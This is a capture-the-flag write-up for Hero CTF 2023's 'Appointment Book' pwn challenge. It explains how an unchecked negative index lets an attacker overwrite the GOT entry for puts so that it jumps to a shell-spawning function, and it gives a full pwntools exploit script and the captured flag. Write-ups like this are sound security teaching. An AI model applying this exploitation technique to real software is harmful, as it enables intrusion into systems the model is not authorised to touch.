# Hero CTF 2023 - PWN - Appointment Book

Appointment book was a pwn challenge in Hero CTF worth 298 points.

We are given a binary that gives us our local time and then gives us the option to either list appointments, add an appointment or exit:

```
========== Welcome to your appointment book. ==========

[LOCAL TIME] 2023-05-16 08:11:56

***** Select an option *****
1) List appointments
2) Add an appointment
3) Exit

Your choice:
```

Opening up the binary in Ghidra shows us a function `debug_remote` that spawns a shell. This is our win function and we need to find a way to execute it in order to get the flag.

Taking a look at our main function, we see that it firsts fills the memory pointed by `appointments` which is of size 0x80 with 0 bytes, then it gets the current time and converts it to a date using the function timestamp_to_date and displays it :

```c
memset(appointments,0,0x80);
puts("========== Welcome to your appointment book. ==========");
start_time = time((time_t *)0x0);
start_time_date = timestamp_to_date(start_time);
printf("\n[LOCAL TIME] %s\n",start_time_date);
fflush(stdout);
```

After that we see that it calls from within a while true loop the menu function which displays the menu and returns the character inputted by the user. Then depending on the choice, main either calls list_appointments(), create_appointment(), exits, or call out an unknown choice.

We can guess from list_appointments() and create_apppointement(), the structure of appointments in this program. Each appointment first contains a time_t object representing its timestamp and then a pointer to a message (char*) that has at most 62 characters. This is a 64 bit program meaning that the total size of one appointment is 16 bytes because time_t corresponds to a signed long integer (size of 8 bytes) and a pointer is 8 bytes long. The appointments are stored one after another in the memory pointed to by `appointments`. There are a total of 8 appointments that can be stored.

The vulnerability in this program lies in the fact that we can choose the index of the appointment we are adding in create_appointment:

```c
  do {
    printf("[+] Enter the index of this appointment (0-7): ");
    fflush(stdout);
    __isoc99_scanf(&DAT_00402110,&index);
    getchar();
  } while (7 < index);
``` 

As you can see, the appointment indexes should range from 0 to 7 but we are only checking that the appointment is not bigger than 7, meaning that we can input negative numbers. Since that value of index is used to place our data in memory, we can overwrite memory that is placed above `appointments`.

```c
cur_time = (time_t *)(appointments + (long)index * 0x10);
printf("[+] Enter a date and time (YYYY-MM-DD HH:MM:SS): ");
fflush(stdout);
fgets(local_28,0x1e,stdin);
tVar1 = date_to_timestamp(local_28);
*cur_time = tVar1;
printf("[+] Converted to UNIX timestamp using local timezone: %ld\n",*cur_time);
printf("[+] Enter an associated message (place, people, notes...): ");
fflush(stdout);
fgets(local_20,0x3e,stdin);
cur_time[1] = (time_t)local_20;
free(local_28);
```

And we can find above `appointments`, a bunch of pointers to interesting functions we can overwrite:

![Possible functions we can overwrite](/images/Appointment%20Book/poss_fct_overwrite.png)

So what we need to do is overwrite the pointer to one of these functions so that it points to our win function, and then the next time this function is called, it will instead call our win function giving us a shell.

`appointments` is at address 0x4037a0 and if we give an index of -12, since it is multipled by 0x10, we end up overwriting address 0x4036e0 which corresponds to puts.

So how do we link to our win function? Well, we know that each appointment first stores its timestamp and then a message. So we can use timestamp to point to the address of our win function. For our purposes, we only need to know that a timestamp is another way to represent the date we associate to an appointment and it is calculated in this program using standard linux functions, meaning we can use an online timestamp converter to know the date we need to give the program to get a specific timestamp.

Our win function is located at address 0x401336, which corresponds to 4199222 in decimal format, if we look online this corresponds to Wednesday, February 18, 1970 2:27:02 PM GMT, meaning that if we input 1970-02-18 14:27:02 when creating an appointment, we can point to our win function. 

Note that if you are running this program locally and your timezone is not GMT, you need to convert the address you are inputting so that it fits to your timezone. For the remote, we can make use of the fact that at the start of the program, the local time is displayed to know what the correct timezone is.

We can put all of this together in python script (the base of the script is generated using `pwn template --host=static-03.heroctf.fr --port=5000 appointment_book`):

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=static-03.heroctf.fr' '--port=5000' appointment_book
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('appointment_book')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'static-03.heroctf.fr'
port = int(args.PORT or 5000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
io.recv()
io.sendline(b'2')
io.recv()
io.sendline(b'-12')
io.recv()
io.sendline(b'1970-02-18 14:27:02')
io.recv()
io.sendline(b'a')
io.sendline(b'cat flag.txt')
flag = io.recv().decode()
print(flag) 
io.interactive()
```

And the flag is: `Hero{Unch3ck3d_n3g4t1v3_1nd3x_1nt0_G0T_0v3wr1t3_g03s_brrrrrr}`

## Contact

If you have any questions or remarks don't hesitate to reach out on discord to *therokdaba#9872*.

Go back to the [homepage](https://therokdaba.github.io/) of this website.